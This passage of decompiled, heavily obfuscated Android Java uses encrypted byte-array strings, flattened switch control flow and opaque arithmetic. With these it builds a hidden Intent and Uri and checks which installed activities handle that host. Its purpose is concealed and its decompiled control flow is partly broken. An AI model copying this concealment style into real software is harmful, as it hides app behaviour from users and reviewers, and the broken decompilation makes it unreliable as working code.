                    long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j9 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j8 + j7;
                    long j10 = (j9 >>> 48) & 43690;
                    long j11 = ((j10 >>> 2) | (j10 >>> 1)) & 858993459;
                    long j12 = ((j11 >>> 2) | j11) & 252645135;
                    long j13 = (j9 >>> 32) & 43690;
                    long j14 = ((j13 >>> 2) | (j13 >>> 1)) & 858993459;
                    long j15 = ((j14 >>> 2) | j14) & 252645135;
                    long j16 = ((((j15 >>> 4) | j15) & 16711935) << 16) | ((((j12 >>> 4) | j12) & 16711935) << 24);
                    long j17 = (j9 >>> 16) & 43690;
                    long j18 = ((j17 >>> 2) | (j17 >>> 1)) & 858993459;
                    long j19 = ((j18 >>> 2) | j18) & 252645135;
                    long j20 = j9 & 43690;
                    long j21 = ((j20 >>> 2) | (j20 >>> 1)) & 858993459;
                    long j22 = ((j21 >>> 2) | j21) & 252645135;
                    bArr[(((int) ((((j22 >>> 4) | j22) & 16711935) | (((((j19 >>> 4) | j19) & 16711935) << 8) | j16))) + 134223619) ^ 453353389] = 122;
                    bArr[3] = 33;
                    bArr[4] = -97;
                    bArr[5] = -77;
                    bArr[6] = -75;
                    i = i5;
                    long j23 = i;
                    long j24 = (j8 | j7) + ((((((((j23 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j23 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j23 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j23 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j25 = (j24 >>> 48) & 21845;
                    long j26 = ((j25 >>> 1) | j25) & 858993459;
                    long j27 = ((j26 >>> 2) | j26) & 252645135;
                    long j28 = (j24 >>> 32) & 21845;
                    long j29 = ((j28 >>> 1) | j28) & 858993459;
                    long j30 = ((j29 >>> 2) | j29) & 252645135;
                    long j31 = ((((j30 >>> 4) | j30) & 16711935) << 16) + ((((j27 >>> 4) | j27) & 16711935) << 24);
                    long j32 = (j24 >>> 16) & 21845;
                    long j33 = ((j32 >>> 1) | j32) & 858993459;
                    long j34 = ((j33 >>> 2) | j33) & 252645135;
                    long j35 = j24 & 21845;
                    long j36 = ((j35 >>> 1) | j35) & 858993459;
                    long j37 = ((j36 >>> 2) | j36) & 252645135;
                    try {
                        bArr[7] = (((((int) ((((j37 >>> 4) | j37) & 16711935) | (((((j34 >>> 4) | j34) & 16711935) << 8) | j31))) | 918580899) & 356611202) + 1108118056) ^ 1464729315;
                        bArr[8] = -78;
                        bArr[9] = -125;
                        bArr[10] = 62;
                        bArr[11] = -85;
                        bArr[12] = -89;
                        bArr[13] = -25;
                        bArr[14] = -22;
                        bArr[15] = -126;
                        bArr[16] = -80;
                        bArr[17] = 98;
                        bArr[18] = -66;
                        bArr[19] = 43;
                        bArr[20] = 40;
                        bArr[21] = 48;
                        bArr[22] = 108;
                        k(bArr, new byte[]{123, 24, 67, 71, 41, 45, -32, 98, 49, -120, 10, -10, -107, -109, -27, -85, 60, -35, 122, 26, 77, -94, 51});
                        Charset charset = StandardCharsets.UTF_8;
                        String intern = new String(bArr, charset).intern();
                        byte[] bArr2 = new byte[4];
                        long j38 = 1350779181;
                        long j39 = (((((((((j38 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j38 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j38 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j38 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (j8 | j6 | (j5 + j4));
                        long j40 = (j39 >>> 48) & 43690;
                        long j41 = ((j40 >>> 2) | (j40 >>> 1)) & 858993459;
                        long j42 = (j41 | (j41 >>> 2)) & 252645135;
                        long j43 = (j39 >>> 32) & 43690;
                        long j44 = ((j43 >>> 2) | (j43 >>> 1)) & 858993459;
                        long j45 = ((j44 >>> 2) | j44) & 252645135;
                        long j46 = (((j42 | (j42 >>> 4)) & 16711935) << 24) | ((((j45 >>> 4) | j45) & 16711935) << 16);
                        long j47 = (j39 >>> 16) & 43690;
                        long j48 = ((j47 >>> 2) | (j47 >>> 1)) & 858993459;
                        long j49 = ((j48 >>> 2) | j48) & 252645135;
                        long j50 = ((((j49 >>> 4) | j49) & 16711935) << 8) + j46;
                        long j51 = j39 & 43690;
                        long j52 = ((j51 >>> 2) | (j51 >>> 1)) & 858993459;
                        long j53 = (j52 | (j52 >>> 2)) & 252645135;
                        long j54 = 1973141951;
                        long j55 = 622362770 + ((int) (((j53 | (j53 >>> 4)) & 16711935) + j50));
                        long j56 = (((((((((j54 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j54 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j54 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j54 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + ((((((((j55 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j55 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j55 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j55 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
                        long j57 = (j56 >>> 48) & 21845;
                        long j58 = (j57 | (j57 >>> 1)) & 858993459;
                        long j59 = (j58 | (j58 >>> 2)) & 252645135;
                        long j60 = (j56 >>> 32) & 21845;
                        long j61 = ((j60 >>> 1) | j60) & 858993459;
                        long j62 = ((j61 >>> 2) | j61) & 252645135;
                        long j63 = (((j59 | (j59 >>> 4)) & 16711935) << 24) | ((((j62 >>> 4) | j62) & 16711935) << 16);
                        long j64 = (j56 >>> 16) & 21845;
                        long j65 = ((j64 >>> 1) | j64) & 858993459;
                        long j66 = ((j65 >>> 2) | j65) & 252645135;
                        long j67 = j56 & 21845;
                        long j68 = (j67 | (j67 >>> 1)) & 858993459;
                        long j69 = (j68 | (j68 >>> 2)) & 252645135;
                        bArr2[(int) (((j69 | (j69 >>> 4)) & 16711935) + (j63 | ((((j66 >>> 4) | j66) & 16711935) << 8)))] = 115;
                        bArr2[1] = 98;
                        bArr2[2] = -123;
                        bArr2[3] = 126;
                        k(bArr2, new byte[]{77, -38, -106, -2, 125, 113, -72, -85});
                        try {
                            t(intern, new String(bArr2, charset).intern());
                            c4 = 10958;
                            i4 = i;
                            z3 = true;
                            intentFilter2 = intentFilter;
                        } catch (Exception e4) {
                            e = e4;
                            i4 = i;
                            intentFilter2 = intentFilter;
                            str = e;
                            c4 = 15691;
                        }
                    } catch (Exception e5) {
                        e = e5;
                    }
                case 62141:
                    return i4;
                case 48687:
                    str = str;
                    c4 = 62141;
                case 10118:
                case 37247:
                    c4 = 903;
                case 54366:
                    try {
                        byte[] bArr3 = {125, 78, 23, -111, -37, 41, -49, -99};
                        k(bArr3, new byte[]{21, 2, 67, 67, 58, 34, 35, 111});
                        Charset charset2 = StandardCharsets.UTF_8;
                        str = new String(bArr3, charset2).intern();
                        Uri.Builder builder = new Uri.Builder();
                        byte[] bArr4 = {68, 119, -28, -93, -6};
                        k(bArr4, new byte[]{-8, -119, -8, 108, 94, 58, -65, -123});
                        Uri.Builder authority = builder.scheme(new String(bArr4, charset2).intern()).authority(str);
                        byte[] bArr5 = new byte[11];
                        bArr5[i4] = 7;
                        bArr5[1] = 37;
                        long j70 = -1;
                        long j71 = i4;
                        long j72 = (((((j71 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                        long j73 = (((((((j71 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                        long j74 = j73 | j72;
                        long j75 = (((((((j71 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                        long j76 = j75 | j74;
                        long j77 = (((((((j71 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                        long j78 = (((((j70 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                        long j79 = (((((((j70 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                        long j80 = j79 + j78;
                        long j81 = (((((((j70 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                        long j82 = (((((((j70 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                        long j83 = (j82 | (j81 + j80)) + (j77 | j76);
                        long j84 = (j83 >>> 48) & 21845;
                        long j85 = ((j84 >>> 1) | j84) & 858993459;
                        long j86 = ((j85 >>> 2) | j85) & 252645135;
                        long j87 = (j83 >>> 32) & 21845;
                        long j88 = ((j87 >>> 1) | j87) & 858993459;
                        long j89 = ((j88 >>> 2) | j88) & 252645135;
                        long j90 = ((((j89 >>> 4) | j89) & 16711935) << 16) | ((((j86 >>> 4) | j86) & 16711935) << 24);
                        long j91 = (j83 >>> 16) & 21845;
                        long j92 = ((j91 >>> 1) | j91) & 858993459;
                        long j93 = ((j92 >>> 2) | j92) & 252645135;
                        long j94 = j83 & 21845;
                        long j95 = ((j94 >>> 1) | j94) & 858993459;
                        long j96 = ((j95 >>> 2) | j95) & 252645135;
                        int i6 = (((int) ((((j96 >>> 4) | j96) & 16711935) | ((((j93 >>> 4) | j93) & 16711935) << 8) | j90)) | 492035990) & (-1860173135);
                        bArr5[(i6 + 1369461427) - (((1614817280 + i6) & (-245355853)) * 2)] = 30;
                        bArr5[3] = -101;
                        bArr5[4] = 73;
                        bArr5[5] = 25;
                        bArr5[6] = 106;
                        bArr5[7] = -86;
                        bArr5[8] = -122;
                        bArr5[9] = 61;
                        bArr5[10] = -15;
                        byte[] bArr6 = new byte[11];
                        bArr6[i4] = 120;
                        bArr6[1] = -120;
                        bArr6[2] = 79;
                        bArr6[3] = -23;
                        bArr6[4] = -80;
                        bArr6[5] = 57;
                        bArr6[V2.a(146801888, -1661911577, -1808713466) ^ 1808713470] = -60;
                        bArr6[7] = -4;
                        bArr6[8] = 112;
                        bArr6[9] = -87;
                        bArr6[10] = 37;
                        k(bArr5, bArr6);
                        Uri build = authority.path(new String(bArr5, charset2).intern()).build();
                        byte[] bArr7 = new byte[26];
                        bArr7[i4] = -74;
                        bArr7[1] = -45;
                        bArr7[2] = -25;
                        bArr7[3] = -117;
                        bArr7[4] = -54;
                        bArr7[5] = 17;
                        bArr7[6] = -99;
                        bArr7[7] = -13;
                        bArr7[8] = 91;
                        bArr7[9] = -29;
                        bArr7[10] = -107;
                        bArr7[11] = -20;
                        bArr7[12] = 47;
                        bArr7[13] = -3;
                        bArr7[14] = -96;
                        bArr7[15] = 52;
                        i3 = i4;
                        intentFilter = intentFilter2;
                        long j97 = 4296761;
                        long j98 = j79 | j78;
                        long j99 = (((((((((j97 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j97 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j97 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j97 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j82 | (j81 + j98));
                        long j100 = (j99 >>> 48) & 43690;
                        long j101 = ((j100 >>> 2) | (j100 >>> 1)) & 858993459;
                        long j102 = ((j101 >>> 2) | j101) & 252645135;
                        long j103 = (j99 >>> 32) & 43690;
                        long j104 = ((j103 >>> 2) | (j103 >>> 1)) & 858993459;
                        long j105 = ((j104 >>> 2) | j104) & 252645135;
                        long j106 = ((((j105 >>> 4) | j105) & 16711935) << 16) + ((((j102 >>> 4) | j102) & 16711935) << 24);
                        long j107 = (j99 >>> 16) & 43690;
                        long j108 = ((j107 >>> 2) | (j107 >>> 1)) & 858993459;
                        long j109 = ((j108 >>> 2) | j108) & 252645135;
                        long j110 = j99 & 43690;
                        long j111 = ((j110 >>> 2) | (j110 >>> 1)) & 858993459;
                        long j112 = ((j111 >>> 2) | j111) & 252645135;
                        long j113 = 272871977;
                        long j114 = 268575232 + ((int) ((((j112 >>> 4) | j112) & 16711935) + ((((j109 >>> 4) | j109) & 16711935) << 8) + j106));
                        long j115 = ((((((((j113 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j113 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j113 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j113 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j114 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j114 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j114 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j114 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
                        long j116 = (j115 >>> 48) & 21845;
                        long j117 = ((j116 >>> 1) | j116) & 858993459;
                        long j118 = ((j117 >>> 2) | j117) & 252645135;
                        long j119 = (j115 >>> 32) & 21845;
                        long j120 = ((j119 >>> 1) | j119) & 858993459;
                        long j121 = ((j120 >>> 2) | j120) & 252645135;
                        long j122 = ((((j121 >>> 4) | j121) & 16711935) << 16) | ((((j118 >>> 4) | j118) & 16711935) << 24);
                        long j123 = (j115 >>> 16) & 21845;
                        long j124 = ((j123 >>> 1) | j123) & 858993459;
                        long j125 = ((j124 >>> 2) | j124) & 252645135;
                        long j126 = ((((j125 >>> 4) | j125) & 16711935) << 8) + j122;
                        long j127 = j115 & 21845;
                        long j128 = (j127 | (j127 >>> 1)) & 858993459;
                        long j129 = (j128 | (j128 >>> 2)) & 252645135;
                        try {
                            bArr7[(int) (((j129 | (j129 >>> 4)) & 16711935) | j126)] = -127;
                            bArr7[17] = 54;
                            bArr7[18] = -61;
                            bArr7[19] = 13;
                            bArr7[20] = -42;
                            bArr7[21] = -70;
                            bArr7[22] = Byte.MIN_VALUE;
                            bArr7[23] = 19;
                            bArr7[24] = -75;
                            bArr7[25] = -7;
                            long b4 = c3.b(j81, j98, j82, j77 + (j75 | (j73 + j72)));
                            long j130 = (b4 >>> 48) & 21845;
                            long j131 = ((j130 >>> 1) | j130) & 858993459;
                            long j132 = ((j131 >>> 2) | j131) & 252645135;
                            long j133 = (b4 >>> 32) & 21845;
                            long j134 = ((j133 >>> 1) | j133) & 858993459;
                            long j135 = ((j134 >>> 2) | j134) & 252645135;
                            long j136 = ((((j135 >>> 4) | j135) & 16711935) << 16) + ((((j132 >>> 4) | j132) & 16711935) << 24);
                            long j137 = (b4 >>> 16) & 21845;
                            long j138 = ((j137 >>> 1) | j137) & 858993459;
                            long j139 = ((j138 >>> 2) | j138) & 252645135;
                            long j140 = b4 & 21845;
                            long j141 = ((j140 >>> 1) | j140) & 858993459;
                            long j142 = ((j141 >>> 2) | j141) & 252645135;
                            k(bArr7, new byte[]{-23, -82, -16, -1, 75, -6, -94, -96, -104, 105, 8, -40, 49, 111, 48, Byte.MIN_VALUE, -28, 54, -115, -91, -102, ((~(-((((int) ((((j142 >>> 4) | j142) & 16711935) + (((((j139 >>> 4) | j139) & 16711935) << 8) + j136))) | (-1989922251)) & 105370129))) + 1610616133) ^ 1715986244, -126, -113, 102, -114});
                            Intent intent = new Intent(new String(bArr7, charset2).intern(), build);
                            long j143 = 38998656;
                            long j144 = j75 + j74;
                            long j145 = (((((((((j143 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j143 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j143 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j143 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (j77 | j144);
                            long j146 = (j145 >>> 48) & 43690;
                            long j147 = ((j146 >>> 2) | (j146 >>> 1)) & 858993459;
                            long j148 = ((j147 >>> 2) | j147) & 252645135;
                            long j149 = (j145 >>> 32) & 43690;
                            long j150 = ((j149 >>> 2) | (j149 >>> 1)) & 858993459;
                            long j151 = ((j150 >>> 2) | j150) & 252645135;
                            long j152 = ((((j151 >>> 4) | j151) & 16711935) << 16) + ((((j148 >>> 4) | j148) & 16711935) << 24);
                            long j153 = (j145 >>> 16) & 43690;
                            long j154 = ((j153 >>> 2) | (j153 >>> 1)) & 858993459;
                            long j155 = ((j154 >>> 2) | j154) & 252645135;
                            long j156 = j145 & 43690;
                            long j157 = ((j156 >>> 2) | (j156 >>> 1)) & 858993459;
                            long j158 = ((j157 >>> 2) | j157) & 252645135;
                            int i7 = ((int) ((((j158 >>> 4) | j158) & 16711935) + ((((j155 >>> 4) | j155) & 16711935) << 8) + j152)) + (((-r2) - 1) | (-705757825)) + 705757825;
                            byte[] bArr8 = {9, 81, 117, 32, 28, 52, 13, -63, (((i7 & 290330629) * 2) + (i7 ^ 290330629)) ^ (-996088571), 93, 8, 99, 108, 28, -77, -52, 18, -24, 97, -31, -60, 51, -31, 62, 121, 57, -90, 108, -23, -20, 34, 50, 115};
                            byte[] bArr9 = new byte[33];
                            bArr9[i3] = 95;
                            bArr9[1] = 54;
                            bArr9[2] = 44;
                            bArr9[3] = -41;
                            bArr9[4] = 36;
                            bArr9[5] = -20;
                            bArr9[6] = -36;
                            bArr9[7] = -5;
                            bArr9[8] = 91;
                            bArr9[9] = 49;
                            bArr9[10] = -18;
                            bArr9[11] = -120;
                            bArr9[12] = 10;
                            bArr9[13] = 98;
                            bArr9[14] = -63;
                            bArr9[15] = 124;
                            bArr9[16] = -106;
                            bArr9[17] = -76;
                            bArr9[18] = 109;
                            bArr9[19] = -51;
                            bArr9[20] = 109;
                            bArr9[21] = -24;
                            bArr9[22] = 104;
                            bArr9[23] = -102;
                            long j159 = (j82 | j81 | j80) + j77 + j144;
                            long j160 = (j159 >>> 48) & 21845;
                            long j161 = ((j160 >>> 1) | j160) & 858993459;
                            long j162 = ((j161 >>> 2) | j161) & 252645135;
                            long j163 = (j159 >>> 32) & 21845;
                            long j164 = ((j163 >>> 1) | j163) & 858993459;
                            long j165 = ((j164 >>> 2) | j164) & 252645135;
                            long j166 = ((((j165 >>> 4) | j165) & 16711935) << 16) | ((((j162 >>> 4) | j162) & 16711935) << 24);
                            long j167 = (j159 >>> 16) & 21845;
                            long j168 = ((j167 >>> 1) | j167) & 858993459;
                            long j169 = ((j168 >>> 2) | j168) & 252645135;
                            long j170 = ((((j169 >>> 4) | j169) & 16711935) << 8) + j166;
                            long j171 = j159 & 21845;
                            long j172 = (j171 | (j171 >>> 1)) & 858993459;
                            long j173 = (j172 | (j172 >>> 2)) & 252645135;
                            int i8 = (int) (((j173 | (j173 >>> 4)) & 16711935) + j170);
                            long j174 = 1015187944;
                            long j175 = i8;
                            long j176 = (((((((((j174 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j174 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j174 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j174 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j175 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j175 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j175 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j175 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + 6148914691236517205L;
                            long j177 = (j176 >>> 48) & 43690;
                            long j178 = ((j177 >>> 2) | (j177 >>> 1)) & 858993459;
                            long j179 = (j178 | (j178 >>> 2)) & 252645135;
                            long j180 = (j176 >>> 32) & 43690;
                            long j181 = ((j180 >>> 2) | (j180 >>> 1)) & 858993459;
                            long j182 = ((j181 >>> 2) | j181) & 252645135;
                            long j183 = (((j179 | (j179 >>> 4)) & 16711935) << 24) | ((((j182 >>> 4) | j182) & 16711935) << 16);
                            long j184 = (j176 >>> 16) & 43690;
                            long j185 = ((j184 >>> 2) | (j184 >>> 1)) & 858993459;
                            long j186 = ((j185 >>> 2) | j185) & 252645135;
                            long j187 = j176 & 43690;
                            long j188 = ((j187 >>> 2) | (j187 >>> 1)) & 858993459;
                            long j189 = (j188 | (j188 >>> 2)) & 252645135;
                            int i9 = ((int) (j183 | ((((j186 >>> 4) | j186) & 16711935) << 8) | ((j189 | (j189 >>> 4)) & 16711935))) & 46195320;
                            long j190 = 67769346;
                            long j191 = (((((((((j190 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j190 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j190 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j190 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j77 + j76 + 6148914691236517205L;
                            long j192 = (j191 >>> 48) & 43690;
                            long j193 = ((j192 >>> 2) | (j192 >>> 1)) & 858993459;
                            long j194 = (j193 | (j193 >>> 2)) & 252645135;
                            long j195 = (j191 >>> 32) & 43690;
                            long j196 = ((j195 >>> 2) | (j195 >>> 1)) & 858993459;
                            long j197 = ((j196 >>> 2) | j196) & 252645135;
                            long j198 = (((j194 | (j194 >>> 4)) & 16711935) << 24) | ((((j197 >>> 4) | j197) & 16711935) << 16);
                            long j199 = (j191 >>> 16) & 43690;
                            long j200 = ((j199 >>> 2) | (j199 >>> 1)) & 858993459;
                            long j201 = ((j200 >>> 2) | j200) & 252645135;
                            long j202 = j191 & 43690;
                            long j203 = ((j202 >>> 2) | (j202 >>> 1)) & 858993459;
                            long j204 = (j203 | (j203 >>> 2)) & 252645135;
                            bArr9[(i9 + ((int) (((j204 | (j204 >>> 4)) & 16711935) | (((((j201 >>> 4) | j201) & 16711935) << 8) + j198)))) ^ 113964642] = -31;
                            bArr9[25] = 21;
                            bArr9[26] = -25;
                            bArr9[27] = -113;
                            bArr9[28] = -109;
                            bArr9[29] = -124;
                            bArr9[30] = 41;
                            bArr9[31] = -104;
                            bArr9[32] = 27;
                            k(bArr8, bArr9);
                            intent.addCategory(new String(bArr8, charset2).intern());
                            it = context.getPackageManager().queryIntentActivities(intent, 131136).iterator();
                            c4 = 903;
                            i4 = i3;
                            intentFilter2 = intentFilter;
                        } catch (Exception e6) {
                            e = e6;
                            i = i3;
                            i4 = i;
                            intentFilter2 = intentFilter;
                            str = e;
                            c4 = 15691;
                        }
                    } catch (Exception e7) {
                        e = e7;
                        i3 = i4;
                        intentFilter = intentFilter2;
                    }
                case 25736:
                    it2 = intentFilter2.authoritiesIterator();
                    c4 = it2 != null ? (char) 32433 : (char) 10118;
                case 15691:
                    str = (Exception) str;
                    c4 = 62141;
                case 51436:
                    intentFilter2 = it.next().filter;
                    c4 = intentFilter2 == null ? (char) 37247 : (char) 25736;
                case 18673:
                    try {
                        c4 = str.equalsIgnoreCase(it2.next().getHost()) ? (char) 45378 : (char) 17969;
                    } catch (Exception e8) {
                        e = e8;
                        i = i4;
                        intentFilter = intentFilter2;
                        i4 = i;
                        intentFilter2 = intentFilter;
                        str = e;
                        c4 = 15691;
                    }
                case 10958:
                    return z3;
                case 903:
                    c4 = it.hasNext() ? (char) 51436 : (char) 48687;
                case 17969:
                case 32433:
                    try {
                    } catch (Exception e9) {
                        str = e9;
                        c4 = 15691;
                    }
                    if (it2.hasNext()) {
                        c4 = 18673;
                    }
                default:
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:2:0x0009. Please report as an issue. */
    public final boolean O() {
        char c4;
        String[] strArr = new String[0];
        String str = null;
        char c5 = 27170;
        int i = 0;
        int i3 = 0;
        while (true) {
            switch (c5) {
                case 27170:
                    strArr = V.f394e;
                    i3 = strArr.length;
                    c5 = 51204;
                    i = 0;
                case 4613:
                    i++;
                    c4 = 51204;
                    c5 = c4;
                case 51204:
                    if (i >= i3) {
                        c4 = 63579;
                        c5 = c4;
                    }
                    c4 = 192;
                    c5 = c4;
                case 40859:
                    byte[] bArr = {-30, -97, 93, -53, -59, -121, 80, 9, -60, -14, -83, -42, 113, -33, -85, -90, 59, 90};
                    byte[] bArr2 = new byte[18];
                    long j2 = 622168603;
                    long j3 = -1;
                    long j4 = ((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j5 = (j4 >>> 48) & 43690;
                    long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
                    long j7 = ((j6 >>> 2) | j6) & 252645135;
                    long j8 = (j4 >>> 32) & 43690;
                    long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
                    long j10 = ((j9 >>> 2) | j9) & 252645135;
                    long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) + ((((j7 >>> 4) | j7) & 16711935) << 24);
                    long j12 = (j4 >>> 16) & 43690;
                    long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                    long j14 = ((j13 >>> 2) | j13) & 252645135;
                    long j15 = j4 & 43690;
                    long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
                    long j17 = ((j16 >>> 2) | j16) & 252645135;
                    int i4 = (int) ((((j17 >>> 4) | j17) & 16711935) + (((((j14 >>> 4) | j14) & 16711935) << 8) | j11));
                    int i5 = (((-1870508032) | i4) * 2) - (i4 ^ (-1870508032));
                    long j18 = -1248339429;
                    long j19 = i5;
